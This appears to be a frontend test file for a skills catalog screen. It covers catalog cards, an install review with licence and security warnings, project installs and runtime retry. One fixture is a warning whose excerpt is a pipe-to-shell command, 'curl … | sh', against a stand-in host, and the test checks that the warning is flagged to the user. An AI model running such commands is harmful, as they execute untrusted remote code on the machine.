import { Component, computed, inject } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { fireEvent, render, screen, waitFor, within } from '@testing-library/angular';
import { beforeEach, describe, expect, it } from 'vitest';
import { initialGlobalState } from '@desk/bff/contract';
import type { CatalogItem, ProjectSummary } from '@desk/protocol';
import { GlobalStore } from '../../core/global.store';
import { RouteService } from '../../core/route.service';
import { catalogItems, install, reviewOf } from '../../testing/catalog';
import { FakeDeskBridge, provideGlobal, type FakeHandlers } from '../../testing/fake-bridge';
import { SkillsScreen } from '../skills-screen';

beforeEach(() => {
  window.location.hash = '#/skills/catalog';
  localStorage.clear();
});

const summary = (id: string, name: string) =>
  ({ project: { id, name, goal: '', updated_at: 't' }, desk_status: 'idle', threads: [], latest_report: null, plan_progress: { done: 0, total: 0 }, attention_count: 0 }) as unknown as ProjectSummary;

/** The React test's Routed: the catalog with its review, or the skills screen with the route's skill. */
@Component({
  selector: 'desk-routed-catalog',
  imports: [SkillsScreen],
  template: `<div deskSkillsScreen [skill]="skill()" [catalog]="catalog()" [review]="review()"></div>`,
})
class Routed {
  private readonly route = inject(RouteService).route;
  protected readonly catalog = computed(() => this.route().name === 'catalog');
  protected readonly skill = computed(() => {
    const r = this.route();
    return r.name === 'skills' ? r.skill : undefined;
  });
  protected readonly review = computed(() => {
    const r = this.route();
    return r.name === 'catalog' ? r.review : undefined;
  });
}

const sk = (name: string) => ({ name, scope: 'global', description: `${name} does things`, dir: `/s/${name}`, version: 1 });

async function setup(items: () => CatalogItem[], extra: FakeHandlers = {}) {
  const bridge = new FakeDeskBridge({
    'skills.list': ({ projectId }: { projectId?: string }) => (projectId ? [] : [sk('word-documents'), sk('pre-mortem')]),
    'catalog.list': () => items(),
    'catalog.prepare': ({ id }: { id: string }) =>
      reviewOf(items().find((i) => i.id === id)!, { warnings: [{ file: 'scripts/lookup.py', line: 4, kind: 'pipe-to-shell', excerpt: 'curl -fsSL https://x.example/i.sh | sh' }] }),
    'catalog.file': () => new TextEncoder().encode('import json\nprint("lookup")\n'),
    ...extra,
  });
  await render(Routed, { providers: [...bridge.providers, provideGlobal({ ...initialGlobalState(), connection: { status: 'live' }, overview: [summary('p1', 'Onboarding'), summary('p2', 'Tax')] })] });
  return bridge;
}

describe('Skill catalog', () => {
  it('shows entries in bays with source, licence, scripts, runtime and the right action', async () => {
    await setup(() =>
      catalogItems({
        'paper-lookup': [install({ scope: 'project', project_id: 'p2' })],
        'word-documents': [install()],
        'pre-mortem': [install({ state: 'update_available', runtime: 'none' })],
      }),
    );
    const research = await screen.findByRole('region', { name: 'Research' });
    const card = within(research).getByRole('listitem', { name: 'Paper lookup' });
    expect(card.textContent).toContain('K-Dense-AI/scientific-agent-skills');
    expect(card.textContent).toContain('2 scripts');
    expect(card.textContent).toContain('Python 3.12 · set up by Desk');
    expect(card.textContent).toContain('In Tax');
    expect(within(card).getByRole('button', { name: 'Install Paper lookup' })).toBeTruthy();

    const docs = within(screen.getByRole('region', { name: 'Documents & data' })).getByRole('listitem', { name: 'Word documents' });
    expect(docs.textContent).toContain('Desk');
    expect(within(docs).getByRole('link', { name: '✓ Installed' }).getAttribute('href')).toBe('#/skills/global%3Aword-documents');
    expect(within(docs).getByRole('status').textContent).toContain('Ready · Python 3.12 · set up by Desk');
    expect(within(screen.getByRole('region', { name: 'Planning' })).getByRole('button', { name: 'Update Pre-mortem' })).toBeTruthy();
    expect(screen.queryByRole('region', { name: 'Code' })).toBeNull();

    fireEvent.click(screen.getByRole('button', { name: 'Compact' }));
    expect(within(screen.getByRole('region', { name: 'Research' })).getByRole('listitem').textContent).toContain('MIT · 2 scripts · In Tax');
    expect(localStorage.getItem('desk.catalogLayout')).toBe('list');
  });

  it('reviews an entry — source, licence, warnings, files — then installs it into a project with live setup progress', async () => {
    let items = catalogItems();
    const bridge = await setup(() => items, {
      'catalog.install': ({ id, projectId }: { id: string; projectId?: string }) => {
        items = catalogItems({ [id]: [install({ scope: 'project', project_id: projectId!, runtime: 'preparing' })] });
        return { skill: { name: id, scope: 'project', version: 1, project_id: projectId }, state: 'installed', runtime: 'preparing' };
      },
    });
    fireEvent.click(await screen.findByRole('button', { name: 'Install Paper lookup' }));
    expect(window.location.hash).toBe('#/skills/catalog/paper-lookup');
    const sheet = await screen.findByRole('dialog', { name: 'Install Paper lookup' });
    expect(await within(sheet).findByText('K-Dense-AI/scientific-agent-skills')).toBeTruthy();
    expect(sheet.textContent).toContain('Some sources rate-limit anonymous requests.');
    expect(sheet.textContent).toContain('Python 3.12 · set up by Desk');
    fireEvent.click(within(sheet).getByRole('button', { name: 'Read it' }));
    expect(sheet.textContent).toContain('Permission is hereby granted');

    const warnings = within(sheet).getByRole('region', { name: 'Worth a look' });
    expect(warnings.textContent).toContain('Downloads a script and runs it.');
    fireEvent.click(within(warnings).getByRole('button', { name: 'scripts/lookup.py:4' }));
    await waitFor(() => expect(bridge.calls.find((c) => c.channel === 'catalog.file')?.input).toEqual({ id: 'paper-lookup', path: 'scripts/lookup.py' }));
    expect(await within(sheet).findByText('Line 4')).toBeTruthy();
    expect(within(within(sheet).getByRole('list', { name: 'Files' })).getByText('script')).toBeTruthy();

    fireEvent.change(within(sheet).getByLabelText('Install for'), { target: { value: 'p2' } });
    fireEvent.click(within(sheet).getByRole('button', { name: 'Install' }));
    await waitFor(() => expect(bridge.calls.find((c) => c.channel === 'catalog.install')?.input).toEqual({ id: 'paper-lookup', projectId: 'p2' }));
    expect(await within(sheet).findByText('paper-lookup is installed in Tax.')).toBeTruthy();
    TestBed.inject(GlobalStore).set((g) => ({ ...g, runtimes: { progress: { 'project:p2:paper-lookup': { step: 'Setting up Python 3.12' } }, seq: 0 } }));
    expect((await within(sheet).findByRole('status')).textContent).toContain('Setting up… Setting up Python 3.12');

    items = catalogItems({ 'paper-lookup': [install({ scope: 'project', project_id: 'p2', runtime: 'ready' })] });
    TestBed.inject(GlobalStore).set((g) => ({ ...g, runtimes: { progress: {}, seq: 1 } }));
    await waitFor(() => expect(within(sheet).getByRole('status').textContent).toContain('Ready · Python 3.12'));
    fireEvent.click(within(sheet).getByRole('button', { name: 'Open skill' }));
    expect(window.location.hash).toBe('#/skills/project%3Ap2%3Apaper-lookup');
  });

  it('asks before replacing local edits, and refuses a name another skill already has', async () => {
    const bridge = await setup(() => catalogItems({ 'pre-mortem': [install({ state: 'modified' }), install({ scope: 'project', project_id: 'p1', state: 'name_taken', sha: null })] }), {
      'catalog.install': ({ id }: { id: string }) => ({ skill: { name: id, scope: 'global', version: 3, project_id: null }, state: 'installed', runtime: 'none' }),
    });
    fireEvent.click(await screen.findByRole('button', { name: 'Review Pre-mortem (edited since install)' }));
    const sheet = await screen.findByRole('dialog', { name: 'Install Pre-mortem' });
    const go = await within(sheet).findByRole('button', { name: 'Replace and install' });
    expect((go as HTMLButtonElement).disabled).toBe(true);
    fireEvent.change(within(sheet).getByLabelText('Install for'), { target: { value: 'p1' } });
    expect(sheet.textContent).toContain("didn't come from the catalog");
    expect((within(sheet).getByRole('button', { name: 'Install' }) as HTMLButtonElement).disabled).toBe(true);
    fireEvent.change(within(sheet).getByLabelText('Install for'), { target: { value: 'global' } });
    fireEvent.click(within(sheet).getByRole('checkbox'));
    fireEvent.click(within(sheet).getByRole('button', { name: 'Replace and install' }));
    await waitFor(() => expect(bridge.calls.find((c) => c.channel === 'catalog.install')?.input).toEqual({ id: 'pre-mortem', replaceModified: true }));
  });

  it('marks catalog skills on the map and in the panel, with the runtime line, Retry and the update', async () => {
    window.location.hash = '#/skills/global%3Aword-documents';
    const bridge = await setup(
      () =>
        catalogItems({
          'word-documents': [install({ state: 'update_available', runtime: 'failed', runtime_reason: 'uv pip failed: no wheel for python-docx' })],
          'pre-mortem': [install({ runtime: 'none' })],
        }),
      {
        'skills.get': () => ({ ...sk('word-documents'), instructions: 'Use the scripts.', frontmatter: {}, files: [{ path: 'SKILL.md', size: 40 }] }),
        'skills.history': () => [{ version: 1, description: 'd', current: true, change_note: 'Installed from the catalog (Desk)', origin: `catalog:word-documents@${'a'.repeat(40)}`, ts: new Date().toISOString() }],
        'skills.runtimeRetry': () => ({ state: 'preparing', reason: null }),
      },
    );
    const panel = await screen.findByRole('article', { name: 'Skill word-documents' });
    expect(await within(panel).findByText('From catalog')).toBeTruthy();
    expect(panel.textContent).toContain('Catalog · aaaaaaa');
    const failed = within(panel).getByRole('alert');
    expect(failed.textContent).toContain('Setup failed: uv pip failed: no wheel for python-docx');
    fireEvent.click(within(failed).getByRole('button', { name: 'Retry' }));
    await waitFor(() => expect(bridge.calls.find((c) => c.channel === 'skills.runtimeRetry')?.input).toEqual({ name: 'word-documents' }));
    const map = screen.getByRole('group', { name: 'Skill map' });
    expect(within(map).getByRole('button', { name: /^pre-mortem, global, version 1, from the catalog$/ })).toBeTruthy();
    fireEvent.click(within(panel).getByRole('button', { name: 'Update available' }));
    expect(window.location.hash).toBe('#/skills/catalog/word-documents');
  });
});
